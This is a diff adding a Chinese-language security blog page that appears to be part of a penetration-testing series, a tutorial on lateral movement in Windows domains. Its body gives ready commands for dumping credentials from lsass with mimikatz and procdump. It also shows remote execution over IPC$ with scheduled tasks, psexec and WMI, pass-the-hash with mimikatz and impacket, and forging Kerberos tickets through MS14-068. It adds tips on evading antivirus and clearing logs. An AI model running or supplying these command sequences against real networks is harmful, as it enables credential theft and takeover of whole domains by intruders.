@@ -1,0 +1,856 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" href="/img/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#8c9ae6">
+  <meta name="author" content="HackerTerry">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="简介在内网渗透中，当攻击者获取到内网某台机器的控制权后，会以被攻陷的主机为跳板，通过收集域内凭证等各种方法，访问域内其他机器，进一步扩大资产范围。通过此类手段，攻击者最终可能获得域控制器的访问权限，甚至完全控制基于Windows操作系统的整个内网环境，控制域环境下的全部机器。当然，域内也有可能出现Linux主机，但概率很低。 利用方式首先，信息收集是必不可少的。我们一般使用mimikatz（俗称”">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透（五）--横向移动">
+<meta property="og:url" content="https://rookieterry.github.io/2022/01/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%BA%94%EF%BC%89-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/index.html">
+<meta property="og:site_name" content="HackerTerry&#39;s Blog">
+<meta property="og:description" content="简介在内网渗透中，当攻击者获取到内网某台机器的控制权后，会以被攻陷的主机为跳板，通过收集域内凭证等各种方法，访问域内其他机器，进一步扩大资产范围。通过此类手段，攻击者最终可能获得域控制器的访问权限，甚至完全控制基于Windows操作系统的整个内网环境，控制域环境下的全部机器。当然，域内也有可能出现Linux主机，但概率很低。 利用方式首先，信息收集是必不可少的。我们一般使用mimikatz（俗称”">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-01-25T21:26:06.000Z">
+<meta property="article:modified_time" content="2022-09-17T13:32:40.000Z">
+<meta property="article:author" content="HackerTerry">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>内网渗透（五）--横向移动 - HackerTerry&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"rookieterry.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":null,"google":"UA-241125581-1","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript('https://www.google-analytics.com/analytics.js', function() {
+          window.ga = window.ga || function() { (ga.q = ga.q || []).push(arguments) };
+          ga.l = +new Date;
+          ga('create', 'UA-241125581-1', 'auto');
+          ga('send', 'pageview');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>HackerTerry&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/hacker.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="内网渗透（五）--横向移动"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        HackerTerry
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-01-25 21:26" pubdate>
+          星期二, 一月 25日 2022, 9:26 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          4.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          40 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">内网渗透（五）--横向移动</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2 年前
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在内网渗透中，当攻击者获取到内网某台机器的控制权后，会以被攻陷的主机为跳板，通过收集域内凭证等各种方法，访问域内其他机器，进一步扩大资产范围。通过此类手段，攻击者最终可能获得域控制器的访问权限，甚至完全控制基于Windows操作系统的整个内网环境，控制域环境下的全部机器。当然，域内也有可能出现Linux主机，但概率很低。</p>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>首先，信息收集是必不可少的。我们一般使用mimikatz（俗称”法国大面包“）进行密码或hash值的抓取。注意，使用这款工具需要管理员权限，并且实战中还要做好免杀。如果目标主机是Linux系统，则可使用mimipenguin抓取。</p>
+<p>下面列举出了几个常用命令：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">privilege::debug               <span class="hljs-comment">#提升至debug权限</span><br>sekurlsa::logonpasswords       <span class="hljs-comment">#抓取密码</span><br></code></pre></td></tr></table></figure>
+
+<p>当mimikatz无法正常上传或者被查杀时，mimikatz也可以配合procdump使用。procdump是Windows自带的软件，不会被杀软拦截查杀。下面是常用命令：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell">procdump上执行：<br>procdump <span class="hljs-literal">-accepteula</span> <span class="hljs-literal">-ma</span> lsass.exe lsass.dmp<br>mimikatz上执行：<br>privilege::debug <br>sekurlsa::minidump lsass.dmp<br>sekurlsa::logonPasswords full<br></code></pre></td></tr></table></figure>
+
+<p><strong>通过IPC连接创建计划任务（目标主机需开放135和445端口）</strong></p>
+<p>IPC$(Internet Process Connection) 是共享 “ 命名管道 “ 的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。IPC$是NT2000的一项新功能，它有一个特点，即在同一时间内，两个IP之间只允许建立一个连接。IPC 可以通过验证用户名和密码获得相应的权限，通常在远程管理计算机和查看计算机的共享资源时使用。</p>
+<p>通过ipc$，可以与目标机器建立连接。利用这个连接，不仅可以访问目标机器中的文件，进行上传、下载等操作，还可以在目标机器上运行其他命令，以获取目标机器的目录结构、用户列表等信息。</p>
+<p>利用流程：</p>
+<p>1.建立 IPC 链接到目标主机</p>
+<p>2.拷贝要执行的命令脚本到目标主机</p>
+<p>3.查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本</p>
+<p>4.删除 IPC 链接</p>
+<p>这里仅介绍at和schtasks两种计划任务的使用，实战中要根据不同的系统版本来选择不同种类的计划任务。</p>
+<p>1.at（Windows server&lt;2012）</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">net use \\目标机器IP\ipc<span class="hljs-variable">$</span> <span class="hljs-string">&quot;明文密码&quot;</span> /user:域名\域管理员用户名 <span class="hljs-comment">#建立ipc连接</span><br><span class="hljs-built_in">copy</span> 文件名.bat \\目标机器IP\c<span class="hljs-variable">$</span>                            <span class="hljs-comment">#拷贝bat文件到目标机器，文件内写有系统命令</span><br>at \\目标机器IP 时:分 c:\add.bat                           <span class="hljs-comment">#添加计划任务</span><br></code></pre></td></tr></table></figure>
+
+<p>2.schtasks（Windows server&gt;&#x3D;2012）</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">net use \\目标机器IP\ipc<span class="hljs-variable">$</span> <span class="hljs-string">&quot;明文密码&quot;</span> /user:域名\域管理员用户名   <span class="hljs-comment">#建立ipc连接</span><br><span class="hljs-built_in">copy</span> add.bat \\目标机器IP\c<span class="hljs-variable">$</span>                                <span class="hljs-comment">#复制文件到其C盘</span><br>schtasks /create /s 目标机器IP /ru <span class="hljs-string">&quot;SYSTEM&quot;</span> /tn adduser /<span class="hljs-built_in">sc</span> DAILY /tr c:\文件名.bat /F  对应执行文件                                      <span class="hljs-comment">#创建adduser任务</span><br>schtasks /run /s 目标机器IP /tn adduser /i                  <span class="hljs-comment">#运行adduser任务</span><br>schtasks /delete /s 目标机器IP /tn adduser /f               <span class="hljs-comment">#删除adduser任务</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>利用SMB服务（目标主机需开放445端口）</strong></p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</a></p>
+<p>psexec 是 windows 下非常好的一款远程命令行工具。psexec的使用不需要对方主机开放3389端口，只需要对方开启admin$共享 (该共享默认开启)。但是，假如目标主机开启了防火墙，psexec也是不能使用的，会提示找不到网络路径。由于psexec是Windows提供的工具，所以杀毒软件将其列在白名单中。并且连接会产生日志，所以要注意清理。</p>
+<p>psexec的基本原理：</p>
+<p>1.通过ipc$连接，释放二进制文件psexecsvc.exe到目标</p>
+<p>2.通过服务管理SCManager远程创建一个psexec服务，并启动服务</p>
+<p>3.客户端连接执行命令，服务端通过服务启动相应的程序执行命令并回显数据</p>
+<p>4.运行结束后删除服务</p>
+<p>它的利用分为两种情况，一种需要建立IPC连接，需要知道明文密码；另一种不需要建立IPC连接，可以用hash值认证，但是需要使用第三方软件包IMpacket，且实战中需要做免杀处理。</p>
+<p>第一种情况：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">net use \\目标机器IP\ipc<span class="hljs-variable">$</span> <span class="hljs-string">&quot;明文密码&quot;</span> /user:管理员用户名<br>psexec \\目标机器IP <span class="hljs-literal">-s</span> cmd  <span class="hljs-comment">#需要先有 ipc 链接，-s 以 System 权限运行</span><br></code></pre></td></tr></table></figure>
+
+<p>第二种情况：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">psexec \\目标机器IP <span class="hljs-literal">-u</span> 域管账户 <span class="hljs-literal">-p</span> 明文密码 <span class="hljs-literal">-s</span> cmd<br>psexec <span class="hljs-literal">-hashes</span> :<span class="hljs-variable">$HASH</span><span class="hljs-variable">$</span> ./域管账户<span class="hljs-selector-tag">@</span>目标机器IP<br>psexec <span class="hljs-literal">-hashes</span> :<span class="hljs-variable">$HASH</span><span class="hljs-variable">$</span> 域名/域管账户<span class="hljs-selector-tag">@</span>目标机器IP<br>psexec <span class="hljs-literal">-hashes</span> :hash值 ./administrator<span class="hljs-selector-tag">@</span>目标机器IP <span class="hljs-comment">#官方 Pstools无法采用 hash 连接</span><br></code></pre></td></tr></table></figure>
+
+<p>当然也可以用msf自带的psexec模块进行攻击，模块路径是<code>exploit/windows/smb/psexec</code>。</p>
+<p><strong>利用WMI服务（目标主机需开放135管理端口和445回显端口）</strong></p>
+<p>WMI的全名为“Windows Management Instrumentation”。从Windows 98开始，Windows操作系统都支持WMI。WMI是由一系列工具集组成的，可以通过&#x2F;node选项使用端口135上的远程过程调用(RPC)进行通信以进行远程访问，它允许系统管理员远程执行自动化管理任务，例如远程启动服务或执行命令。</p>
+<p>同样的，WMI服务有三种连接方式，它们各有优缺点。</p>
+<p>第一种是Windows自带的wmic，它只支持明文传递密码，且命令执行没有回显，我们只能把回显输出到txt文本里查看。但正因为它是系统自带的，我们不需要考虑免杀的问题。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">wmic /node:目标机器IP /user:域管账户 /password:域管明文密码 <span class="hljs-keyword">process</span> call create <span class="hljs-string">&quot;cmd.exe /c 系统命令 &gt;C:\文件名.txt&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>第二种同样是Windows自带的CScript，需要配合vbs脚本使用（<em>下载地址：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Vh4ELTFvyBhv3Avzft1fCw">https://pan.baidu.com/s/1Vh4ELTFvyBhv3Avzft1fCw</a> 提取码：xiao</em>）。它只支持明文传递密码，但命令执行有回显，同样无需考虑免杀。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">cscript //nologo wmiexec.vbs /shell 目标机器IP 域管账户 域管明文密码<br></code></pre></td></tr></table></figure>
+
+<p>第三种需要借助第三方软件包IMpacket，支持明文或hash传递密码，有回显，但是要考虑免杀。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">wmiexec ./本地管理员账户:明文密码<span class="hljs-selector-tag">@</span>目标机器IP <span class="hljs-string">&quot;系统命令&quot;</span><br>wmiexec 域名/域管账户:明文密码<span class="hljs-selector-tag">@</span>目标机器IP <span class="hljs-string">&quot;系统命令&quot;</span><br>wmiexec <span class="hljs-literal">-hashes</span> :hash值 ./本地管理员账户<span class="hljs-selector-tag">@</span>目标机器IP <span class="hljs-string">&quot;系统命令&quot;</span><br>wmiexec <span class="hljs-literal">-hashes</span> :hash值 域名/域管账户<span class="hljs-selector-tag">@</span>目标机器IP <span class="hljs-string">&quot;系统命令&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>利用Python脚本批量利用hash</strong></p>
+<p>该脚本是impacket工具包中的一个工具，主要在从Linux像Windows进行横向渗透时使用，十分强大，可以走socks代理进入内网。</p>
+<p>GitHub项目地址：<a target="_blank" rel="noopener" href="https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py">https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py</a></p>
+<p>部分转载自：[内网渗透测试：内网横向移动基础总结 - FreeBuf网络安全行业门户<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/251364.html]">https://www.freebuf.com/articles/network/251364.html]</a>(内网渗透测试：内网横向移动基础总结 - FreeBuf网络安全行业门户<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/251364.html">https://www.freebuf.com/articles/network/251364.html</a>)</p>
+<p><strong>哈希传递（PTH）</strong></p>
+<p>大多数渗透测试人员都听说过哈希传递(Pass The Hash)攻击，该方法通过找到与账户相关的密码散列值(通常是 NTLM Hash)来进行攻击。在域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就能使用哈希传递攻击的方法登录内网中的其他计算机。同时，通过哈希传递攻击攻击者不需要花时间破解哈希密在Windows网络中，散列值就是用来证明身份的（有正确的用户名和密码散列值，就能通过验证），而微软自己的产品和工具显然不会支持这种攻击，于是，攻击者往往会使用第三方工具来完成任务。在Windows Server2012R2及之后版本的操作系统中，默认在内存中不会记录明文密码，因此，攻击者往往会使用工具将散列值传递到其他计算机中，进行权限验证，实现对远程计算机的控制。</p>
+<p>下面以mimikatz为例：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">privilege::debug      <br>sekurlsa::logonpasswords       <br>sekurlsa::pth /user:域管账户 /domain:域名 /ntlm:ntlm值<br></code></pre></td></tr></table></figure>
+
+<p>然后在mimikatz弹回的cmd命令行中建立连接，执行命令即可。例如：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">dir</span> \\目标机器IP\c<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure>
+
+<p>但是，实战中我们不知道获得的ntlm值属于哪一台主机，这就需要在弹出来的cmd命令行中进行测试。</p>
+<p><strong>票据传递（PTT）</strong></p>
+<p>我们在渗透测试中，要使用哈希传递攻击，则必须要获取目标机器的管理员权限。如果没有管理员权限，我们不妨用用票据传递攻击（PTT）。</p>
+<p>在开始学习票据传递之前，我们有必要了解一下Kerberos协议：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/290907.html">Kerberos协议认证过程（理论篇） - FreeBuf网络安全行业门户</a></p>
+<p>在票据传递攻击（PTT）中，我们常用的有MS14-068、黄金票据、白银票据。其中MS14-068可用来横向获取域内主机权限，黄金票据、白银票据则可以用来对域控进行权限维持。这里我们主要结合mimikatz结合exp来利用MS14-068漏洞，至于黄金票据、白银票据我们将在未来的域内权限维持中讲解。</p>
+<p>首先获取域用户的sid：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">whoami /user<br></code></pre></td></tr></table></figure>
+
+<p>用exp生成伪造的凭证（<a target="_blank" rel="noopener" href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">exp下载地址点这里</a>）：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">ms14<span class="hljs-literal">-068</span>.exe <span class="hljs-literal">-u</span> 域成员名<span class="hljs-selector-tag">@</span>域名 <span class="hljs-literal">-s</span> sid <span class="hljs-literal">-d</span> 域控制器地址 <span class="hljs-literal">-p</span> 域成员密码<br></code></pre></td></tr></table></figure>
+
+<p>利用mimikatz清空凭证，因为有域成员凭证会影响伪造：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">mimikatz <span class="hljs-comment"># kerberos::purge         #清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span><br>mimikatz <span class="hljs-comment"># kerberos::list          #查看当前机器凭证</span><br>mimikatz <span class="hljs-comment"># kerberos::ptc 票据文件名  #将票据注入到内存中</span><br></code></pre></td></tr></table></figure>
+
+<p>注入成功后，即可使用<code>net use</code>命令登录目标机器：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">net use \\目标机器IP 密码 /user:用户名<br></code></pre></td></tr></table></figure>
+
+<p><strong>国产内网杀器–Ladon</strong></p>
+<p>由于是图形化工具，所以这里不再赘述。它的功能包括信息收集、协议扫描、漏洞探针、传递攻击等，有兴趣的自行了解。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="category-chain-item">Web安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">#内网渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>内网渗透（五）--横向移动</div>
+      <div>https://rookieterry.github.io/2022/01/25/内网渗透（五）-横向移动/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>HackerTerry</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>星期二, 一月 25日 2022, 9:26 晚上</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                    <i class="iconfont icon-nc"></i>
+                  </span>
+                </a>
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                    <i class="iconfont icon-sa"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/02/24/Python%E7%88%AC%E8%99%AB%E7%88%AC%E5%8F%96%E7%AC%94%E8%B6%A3%E9%98%81%E5%B0%8F%E8%AF%B4/" title="Python爬虫爬取笔趣阁小说">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Python爬虫爬取笔趣阁小说</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/01/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E5%9B%9B%EF%BC%89-%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/" title="内网渗透（四）--通信技术">
+                        <span class="hidden-mobile">内网渗透（四）--通信技术</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.7/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"https://twikoo.terrynet.live/","region":"ap-shanghai","path":"window.location.pathname"},
+          {
+            el: '#twikoo',
+            path: 'window.location.pathname',
+            onCommentLoaded: function() {
+              var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
+              Fluid.plugins.imageCaption(imgSelector);
+              Fluid.plugins.fancyBox(imgSelector);
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
